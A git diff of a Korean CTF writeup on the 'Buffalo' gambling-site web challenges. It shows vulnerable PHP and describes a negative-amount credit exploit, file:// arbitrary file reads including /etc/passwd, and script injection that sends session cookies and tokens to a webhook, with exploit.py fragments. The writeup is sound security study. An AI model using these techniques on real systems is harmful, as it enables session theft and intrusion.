@@ -1,5 +1,5 @@
 ---
-title: '[화이트햇콘테스트-예선] Web+Forensics Writeup'
+title: "[화이트햇콘테스트-예선] Web+Forensics Writeup"
 categories: [writeups, CTF]
 tags: [web, CTF, forensics, writeup]
 ---
@@ -8,8 +8,7 @@ tags: [web, CTF, forensics, writeup]
 
 ## Introduction
 
-> **Buffalo [Steal] (269 pts, 39 solves)**
-> <br>적국이 암호화폐 세탁 목적으로 만든 겜블링 사이트에서 비밀 정보를 탈취하라.
+> **Buffalo [Steal] (269 pts, 39 solves)** > <br>적국이 암호화폐 세탁 목적으로 만든 겜블링 사이트에서 비밀 정보를 탈취하라.
 > <br>URL : http://3.36.92.61/
 > {: .prompt-info }
 
@@ -128,8 +127,8 @@ if(isset($_POST["nick"])) {
     </body>
 </html>
 ```
-
 {: file="mypage.php" }
+
 mypage.php 코드를 보면 VVIP 레벨이 되면 Flag 파일을 보여주는 것 같았습니다.
 또한 VVIP 레벨이 되기 위해서는 100000000 BFL 이 필요하다는 것을 위 PHP 스크립트를 통해서 알 수 있습니다.
 
@@ -160,7 +159,6 @@ if(isset($USER_DATA["amount"])) {
 }
 error("Invalid API call");
 ```
-
 {: file="api/game_slot.php" }
 
 반면 가위바위보의 경우에는 확률적으로 이기는 로직이었습니다.
@@ -220,8 +218,8 @@ if($sel == "win" || $sel == "lose" || $sel == "draw") {
 }
 error("Invalid API call");
 ```
-
 {: file="api/game_rsp.php" }
+
 다만, 눈 여겨볼 점으로는 am 변수 값에 credit amount 값이 들어가게 되는데, mysql query 문을 보면 -(마이너스)연산자로 credit 값을 연산하고 있고, 음수에 대한 필터링이 별도로 없는 것을 알 수 있었습니다. 때문에 credit amount 값을 음수로 주어 비용으로 지불하는 값을 차감되는 게 아니라 오히려 돈을 불릴 수 있는 취약점이 발생하게 됩니다.
 
 ## Exploit
@@ -246,8 +244,7 @@ _credit boom! flag boom!_
 
 ## Introduction
 
-> **Buffalo [Secret] (469 pts, 15 solves)**
-> <br>적국이 암호화폐 세탁 목적으로 만든 겜블링 사이트에서 비밀 정보를 탈취하라.
+> **Buffalo [Secret] (469 pts, 15 solves)** > <br>적국이 암호화폐 세탁 목적으로 만든 겜블링 사이트에서 비밀 정보를 탈취하라.
 > <br>URL : http://3.36.92.61/
 > {: .prompt-info }
 
@@ -273,7 +270,6 @@ RUN chmod +x /tmp/spawn.sh
 
 COPY /flag_SECRET.txt /
 ```
-
 {: file="Dockerfile" }
 
 때문에 우선 Directory Path Traversal/Arbitrary File Read 취약점이 있는지 살펴보았습니다.
@@ -322,7 +318,6 @@ function curl_download($url, $output) {
     curl_close($ch);
 }
 ```
-
 {: file="api/slot_reg.php" }
 
 slotid 변수 값을 조작해 임의 디렉터리로 이동할 수 있을 것 같았고, reel_bur 또는 reel 변수를 조작해 임의의 파일을 읽을 수 있을 것 같았습니다. curl_download 함수에서는 url 의 결과값을 ouput 파일에 저장하는 함수입니다. 이를 이용해서 file:// 프로토콜로 로컬에 있는 임의 파일을 읽어들여, 그 파일의 내용물을 웹 경로로부터 접근할 수 있는 디렉터리인 assets/slot/ 경로에 임의 jpg 파일을 생성하고 해당 파일의 내용을 읽어들이면 문제는 풀릴 것 같았습니다.
@@ -348,7 +343,6 @@ else {
 // ...
 ?>
 ```
-
 {: file="api/\_api_common.php" }
 
 Content-Type이 application/json 이면 GET 파라미터들을 user_data에 합치는 것을 알 수 있었습니다.
@@ -368,7 +362,6 @@ if($is_logined && $user["userid"] == "admin") {
     }
 }
 ```
-
 {: file="\_\_common.php" }
 
 관리자로 요청을 하기 위해서는 웹페이지에 구현되어 있는 Report a bug 기능(/cs/report.php)를 사용해야 했습니다.
@@ -395,7 +388,6 @@ if(isset($_GET["headers"])) {
 // ...
 ?>
 ```
-
 {: file="admin/reg_slot.php" }
 
 이렇게 된다면, /admin/reg_slot.php 경로로 GET 파라미터로 headers 라는 배열을 headers\[Content-Type\]=application/json 형태로 주어서 $USER_DATA 입력 받을 때 GET 파라미터도 허용할 수 있게 해줄 수 있게 되는 것을 알 수 있습니다.
@@ -469,7 +461,6 @@ $slot_id = sha1(random_bytes(32));
     </body>
 </html>
 ```
-
 {: file="admin/reg_slot.php" }
 
 여기서 api/slot_reg.php?name= 뒤에 오는 slot_name 변수의 값이 문자열 그대로 들어가고 있기 때문에 뒤에 다른 파라미터 값들도 이어 붙여줄 수가 있습니다. 그리고 headers 는 application/json 으로 들어가게 되어 GET 파라미터의 값들을 전부 USER_DATA에 merge 해줍니다.
@@ -507,7 +498,6 @@ $(() => {
   }
 });
 ```
-
 {: file="assets/auto_game.js" }
 
 바로 특정 ID에 대한 # hash tag 가 주어지면 해당 요소를 자동으로 클릭해주는 기능이었습니다.
@@ -548,8 +538,7 @@ _flag_SECRET.txt_
 
 ## Introduction
 
-> **Buffalo [Safer] (488 pts, 10 solves)**
-> <br>much safe buffalo
+> **Buffalo [Safer] (488 pts, 10 solves)** > <br>much safe buffalo
 > <br>URL : http://3.39.255.32/
 > {: .prompt-info }
 
@@ -613,7 +602,6 @@ if($sel == "win" || $sel == "lose" || $sel == "draw") {
 }
 error("Invalid API call");
 ```
-
 {: file="api/game_rsp.php" }
 
 이전에는 am 변수 값이 음수가 삽입이 가능해서 단순하게 돈을 불릴 수 있었는데, 이제는 0.25 보다 작으면 안되고, 사용자가 가지고 있는 credit 보다 커야 한다는 조건이 붙은 것을 볼 수 있습니다.
@@ -655,7 +643,6 @@ if(check_pow($USER_DATA["pow"])) {
 }
 error("Wrong pow");
 ```
-
 {: file="api/transfer.php" }
 
 다른 사용자는 안되는데, admin 의 경우에는 돈을 무한히 불릴 수 있었습니다. 이를 이용한다면 관리자가 무한한 돈을 다른 사용자에게 전송해줄 수 있을 것 같았습니다.
@@ -690,7 +677,6 @@ $("#register").click(() => {
 
 });
 ```
-
 {: file="admin/reg_slot.php" }
 
 바로 JSON.parse 함수 내부에서 backtick(`)으로 문자열이 들어간다는 것입니다. backtick을 사용하고 있으면 ${}로 임의 javascript를 삽입할 수 있는 상태를 의미하기도 합니다. 이 방법 외에도 그냥 JSON.parse 함수를 탈출하는 방법도 존재합니다.
@@ -702,7 +688,6 @@ session 의 경우에는 document.cookie 를 가져오면 됩니다. 그럼 타 
 ```php
 let secret_token = btoa('<?=$user["userid"].".".$user["token"]?>').replaceAll("+", "%2b");
 ```
-
 {: file="\_head.php" }
 
 javascript로 secret_token 이라는 값으로 사용자의 token 값을 base64 인코딩해서 대입하고 있는 것을 알 수 있습니다.
@@ -741,7 +726,6 @@ res = client.post(url=url, data={
     'Cookie': f'PHPSESSID={cookie}'
 })
 ```
-
 {: file="exploit.py" }
 
 위 페이로드를 실행하게 되면 다음과 같이 webhook으로 세션 값과 secret_token 값을 받아올 수 있게 됩니다.
@@ -806,8 +790,7 @@ _credit boom! flag boom!_
 
 ## Introduction
 
-> **Buffalo [Key] (499 pts, 4 solves)**
-> <br>적국이 암호화폐 세탁 목적으로 만든 겜블링 사이트에서 비밀 정보를 탈취하라.
+> **Buffalo [Key] (499 pts, 4 solves)** > <br>적국이 암호화폐 세탁 목적으로 만든 겜블링 사이트에서 비밀 정보를 탈취하라.
 > <br>URL : http://3.39.255.32/
 > {: .prompt-info }
 
@@ -860,7 +843,6 @@ if 'Done' in res.text:
 else:
     print('Error')
 ```
-
 {: file="exploit.py" }
 
 /etc/passwd 내용을 보면 아래와 같습니다.
@@ -945,7 +927,6 @@ res = client.post(url=url, data={
     'Cookie': f'PHPSESSID={cookie}'
 })
 ```
-
 {: file="exploit.py" }
 
 webhook 에는 아래와 같은 내용물을 가지도록 했습니다.
